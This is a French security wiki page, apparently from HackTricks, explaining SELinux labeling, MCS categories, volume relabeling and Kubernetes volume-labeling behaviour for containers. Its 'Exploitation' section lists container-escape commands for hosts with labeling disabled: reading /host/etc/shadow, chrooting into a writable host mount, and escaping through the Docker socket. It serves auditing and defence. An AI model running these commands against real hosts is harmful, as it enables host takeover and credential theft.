# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

SELinux est un système de **Mandatory Access Control basé sur les labels**. Chaque processus et objet pertinent peut porter un contexte de sécurité, et la policy détermine quels domaines peuvent interagir avec quels types et de quelle manière. Dans les environnements containerized, cela signifie généralement que le runtime lance le processus du container dans un domaine de container confiné et étiquette le contenu du container avec les types correspondants. Si la policy fonctionne correctement, le processus peut lire et écrire les éléments que son label est censé manipuler, tout en se voyant refuser l'accès aux autres contenus de l'hôte, même si ces contenus deviennent visibles via un mount.

Il s'agit de l'une des protections côté hôte les plus puissantes disponibles dans les déploiements de containers Linux courants. Elle est particulièrement importante sur Fedora, RHEL, CentOS Stream, OpenShift et les autres écosystèmes centrés sur SELinux. Dans ces environnements, un reviewer qui ignore SELinux comprendra souvent mal pourquoi un chemin apparemment évident vers la compromission de l'hôte est en réalité bloqué.

## AppArmor Vs SELinux

La différence générale la plus simple est qu'AppArmor est basé sur les chemins, tandis que SELinux est **basé sur les labels**. Cela a des conséquences importantes pour la sécurité des containers. Une policy basée sur les chemins peut se comporter différemment si le même contenu de l'hôte devient visible sous un chemin de mount inattendu. Une policy basée sur les labels demande plutôt quel est le label de l'objet et ce que le domaine du processus peut faire avec celui-ci. Cela ne rend pas SELinux simple, mais le rend robuste face à une catégorie d'hypothèses fondées sur des manipulations de chemins que les defenders peuvent parfois faire accidentellement dans les systèmes basés sur AppArmor.

Comme le modèle est orienté labels, la gestion des volumes des containers et les décisions de relabeling sont critiques pour la sécurité. Si le runtime ou l'opérateur modifie les labels de manière trop large pour « faire fonctionner les mounts », la boundary de policy censée contenir la workload peut devenir bien plus faible que prévu.

## Labo

Pour vérifier si SELinux est actif sur l'hôte :
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Pour inspecter les labels existants sur l’hôte :
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Pour comparer une exécution normale à une autre où l’étiquetage est désactivé :
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Sur un hôte avec SELinux activé, il s'agit d'une démonstration très pratique, car elle montre la différence entre une workload exécutée sous le domaine de conteneur attendu et une autre à laquelle cette couche d'enforcement a été retirée.

## Utilisation à l'exécution

Podman est particulièrement bien adapté à SELinux sur les systèmes où SELinux fait partie des valeurs par défaut de la plateforme. Rootless Podman associé à SELinux constitue l'une des bases mainstream les plus solides pour les conteneurs, car le processus est déjà non privilégié du côté de l'hôte tout en restant confiné par une politique MAC. Docker peut également utiliser SELinux lorsqu'il est supporté, bien que les administrateurs le désactivent parfois pour contourner les problèmes d'étiquetage des volumes. CRI-O et OpenShift s'appuient fortement sur SELinux dans le cadre de leur isolation des conteneurs. Kubernetes peut également exposer des paramètres liés à SELinux, mais leur utilité dépend évidemment du fait que l'OS du nœud supporte et applique réellement SELinux.<sup>[[2]](#references)</sup>

La leçon récurrente est que SELinux n'est pas un simple ornement optionnel. Dans les écosystèmes conçus autour de lui, il fait partie de la boundary de sécurité attendue. Pour l'énumération des politiques côté hôte, l'analyse des transitions et l'abus des outils d'administration SELinux, consultez la [page générale sur SELinux](../../../interesting-files-permissions/selinux.md).

## Catégories MCS et réétiquetage des volumes

L'isolation des conteneurs est normalement une combinaison de **type enforcement** et de **Multi-Category Security (MCS)**. Deux processus peuvent tous deux s'exécuter sous `container_t`, mais recevoir des niveaux différents tels que `s0:c123,c456` et `s0:c321,c654`. Le contenu privé des conteneurs est étiqueté `container_file_t` avec les catégories correspondantes ; le simple fait d'atteindre le chemin d'un autre conteneur ne suffit donc pas à y accéder. Les runtimes allouent normalement la paire de catégories ; réutiliser manuellement un niveau supprime délibérément cette séparation propre à chaque conteneur.<sup>[[3]](#references)</sup>

Comparez les labels des processus et des mounts au lieu de vérifier uniquement le type :<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Les suffixes de bind-mount modifient les labels des inodes de l'hôte et changent donc la frontière de sécurité, et pas seulement les métadonnées du mount :<sup>[[3]](#references)</sup>

- `:Z` applique un label privé avec les catégories MCS du container. Cette option convient à un volume appartenant à un seul container ou Pod.
- `:z` applique un label partagé afin que d'autres containers confinés puissent également utiliser le contenu (sous réserve des permissions DAC). L'utiliser pour des secrets ou des données propres à un tenant supprime l'isolation MCS qui séparerait autrement les containers.
- Le relabeling est récursif. L'application de l'une ou l'autre option à de larges arborescences de l'hôte telles que `/`, `/etc`, `/usr` ou une arborescence home entière peut à la fois exposer le contenu au container sélectionné et empêcher les services de l'hôte de fonctionner lorsque leurs labels attendus ont été remplacés.

La réutilisation manuelle d'un niveau est facile à repérer dans les lignes de commande et les manifests. Les deux containers suivants reçoivent intentionnellement le même niveau MCS et peuvent donc utiliser le contenu labellisé pour ce niveau :<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Distinguez également `label=nested` de `label=disable` : le premier expose les opérations SELinux à l’intérieur du container et n’autorise les modifications de labels que lorsque la policy le permet, tandis que le second supprime la séparation par labels pour ce workload. Les deux méritent d’être examinés, mais ils ne sont pas équivalents.<sup>[[3]](#references)</sup>

## Mauvaises configurations

L’erreur classique est `label=disable`. En pratique, cela se produit souvent parce qu’un volume mount a été refusé et que la solution temporaire la plus rapide consistait à retirer SELinux de l’équation au lieu de corriger le modèle de labeling.<sup>[[1]](#references)</sup> Une autre erreur fréquente est le relabeling incorrect de contenu de l’hôte. Les opérations de relabeling étendues peuvent permettre à l’application de fonctionner, mais elles peuvent également élargir considérablement les éléments que le container peut toucher, bien au-delà de ce qui était initialement prévu.

Il est également important de ne pas confondre SELinux **installé** avec SELinux **effectif**. Un hôte peut prendre en charge SELinux tout en étant en mode permissive, ou le runtime peut ne pas lancer le workload dans le domain attendu. Dans ces cas, la protection est bien plus faible que ne pourrait le laisser penser la documentation.

## Exploitation

Lorsque SELinux est absent, en mode permissive ou largement désactivé pour le workload, les paths montés depuis l’hôte deviennent beaucoup plus faciles à exploiter. Le même bind mount qui aurait autrement été limité par les labels peut devenir un accès direct aux données de l’hôte ou permettre de le modifier. Cela est particulièrement pertinent lorsqu’il est combiné à des volume mounts inscriptibles, à des runtime directories de container ou à des raccourcis opérationnels qui exposent des paths sensibles de l’hôte par commodité.

SELinux explique souvent pourquoi un writeup de breakout générique fonctionne immédiatement sur un hôte, mais échoue systématiquement sur un autre, même lorsque les runtime flags semblent similaires. L’élément manquant n’est fréquemment ni un namespace ni une capability, mais une label boundary restée intacte.

La vérification pratique la plus rapide consiste à comparer le context actif, puis à sonder les paths montés de l’hôte ou les runtime directories qui seraient normalement confinés par les labels :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si un host bind mount est présent et que le labeling SELinux a été désactivé ou affaibli, une divulgation d’informations survient souvent en premier :
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si le mount est accessible en écriture et que le container est effectivement host-root du point de vue du kernel, l’étape suivante consiste à tester une modification contrôlée de l’hôte plutôt qu’à deviner :
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sur les hôtes compatibles avec SELinux, la perte des labels autour des répertoires d’état d’exécution peut également exposer des chemins directs d’escalade de privilèges :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ces commandes ne remplacent pas une chaîne d'évasion complète, mais elles permettent de déterminer très rapidement si SELinux est ce qui empêchait l'accès aux données de l'hôte ou la modification de fichiers côté hôte.

### Exemple complet : SELinux désactivé + montage de l'hôte accessible en écriture

Si l'étiquetage SELinux est désactivé et que le système de fichiers de l'hôte est monté en écriture à `/host`, un escape complet de l'hôte devient un cas normal d'abus de bind-mount :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si le `chroot` réussit, le processus du container opère désormais depuis le système de fichiers de l’hôte :
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemple complet : SELinux désactivé + répertoire runtime

Si le workload peut atteindre un socket runtime une fois les labels désactivés, l’escape peut être délégué au runtime :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L’observation pertinente est que SELinux était souvent le contrôle qui empêchait précisément ce type d’accès aux chemins de l’hôte ou à l’état d’exécution.

## Vérifications

L’objectif des vérifications SELinux est de confirmer que SELinux est activé, d’identifier le contexte de sécurité actuel et de vérifier si les fichiers ou chemins qui vous intéressent sont effectivement confinés par des labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Ce qui est intéressant ici :

- `getenforce` devrait idéalement retourner `Enforcing` ; `Permissive` ou `Disabled` modifie la signification de toute la section SELinux.
- Si le contexte du processus actuel semble inattendu ou trop large, le workload peut ne pas s’exécuter avec la policy de container prévue.
- Si les fichiers montés depuis l’hôte ou les répertoires runtime possèdent des labels auxquels le processus peut accéder trop librement, les bind mounts deviennent bien plus dangereux.

Lors de l’examen d’un container sur une plateforme prenant en charge SELinux, ne considérez pas le labeling comme un détail secondaire. Dans de nombreux cas, c’est l’une des principales raisons pour lesquelles l’hôte n’est pas déjà compromis.

## Runtime Defaults

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Dépend de l’hôte | La séparation SELinux est disponible sur les hôtes avec SELinux activé, mais le comportement exact dépend de la configuration de l’hôte et du daemon | `--security-opt label=disable`, relabeling large des bind mounts, `--privileged` |
| Podman | Généralement activé sur les hôtes SELinux | La séparation SELinux fait normalement partie de Podman sur les systèmes SELinux, sauf si elle est désactivée | `--security-opt label=disable`, `label=false` dans `containers.conf`, `--privileged` |
| Kubernetes | Attribué par le runtime sur les nœuds SELinux ; configurable explicitement | Le runtime peut attribuer un label unique lorsque le Pod n’en définit pas. `securityContext.seLinuxOptions` contrôle explicitement le label du Pod/volume ; dans Kubernetes 1.37, les volumes éligibles utilisent par défaut le labeling SELinux lors du mount | niveaux MCS dupliqués, nœuds permissifs/désactivés, workloads privilégiés trop larges, `seLinuxChangePolicy: Recursive` appliqué sans distinction <sup>[[2]](#references)[[4]](#references)</sup> |
| Déploiements de type CRI-O / OpenShift | Généralement utilisé de manière intensive | SELinux constitue souvent une partie essentielle du modèle d’isolation des nœuds dans ces environnements | policies personnalisées élargissant excessivement les accès, désactivation du labeling pour des raisons de compatibilité |

Les valeurs par défaut de SELinux dépendent davantage de la distribution que celles de seccomp. Sur les systèmes de type Fedora/RHEL/OpenShift, SELinux est souvent au cœur du modèle d’isolation. Sur les systèmes sans SELinux, il est tout simplement absent.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 a rendu `SELinuxMount` stable et l’a activé par défaut. Pour un PVC éligible, un Pod avec `seLinuxOptions` et un driver CSI annonçant `.spec.seLinuxMount: true`, kubelet utilise `-o context=<label>` au lieu de demander au runtime de relabeler récursivement chaque inode. Les drivers et types de volumes non pris en charge utilisent toujours le chemin récursif. Cela évite un long parcours de relabeling et empêche également la modification des labels persistants de chaque fichier simplement pour exposer le volume à un Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Un mount ne peut porter qu’un seul contexte de ce type. Par conséquent, les Pods avec des **labels SELinux différents** qui utilisent le même volume éligible sur le même nœud ne coexistent plus avec le comportement `MountOption` par défaut : l’un d’eux reste dans l’état `ContainerCreating` avec une erreur `conflicting SELinux labels of volume`. Considérez cela à la fois comme un problème de disponibilité et comme un indice utile indiquant que les workloads partageaient implicitement du stockage entre différentes frontières MCS. Si ce partage est intentionnel — par exemple, un Pod `spc_t` privilégié et un Pod confiné utilisant le même volume — la solution de compatibilité par Pod est `seLinuxChangePolicy: Recursive` ; ne l’appliquez pas à l’échelle du cluster sans comprendre quels chemins le runtime relabelera.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Vérifications utiles côté cluster :<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Le `selinux-warning-controller` optionnel de kube-controller-manager détecte les Pods qui partagent un volume avec des labels incompatibles et expose la métrique `selinux_warning_controller_selinux_volume_conflict`. Activez-le et examinez-le avant les mises à niveau ou avant de modifier le comportement d’étiquetage des volumes ; il aide à distinguer un véritable conflit de policy d’un échec ordinaire de CSI ou du système de fichiers.<sup>[[2]](#references)</sup>

## References

- [1] [Documentation Podman : --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes : Configurer un Security Context pour un Pod ou un Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Documentation de podman run : labels SELinux et relabeling des volumes](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Release Kubernetes v1.37 : SELinuxMount et SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
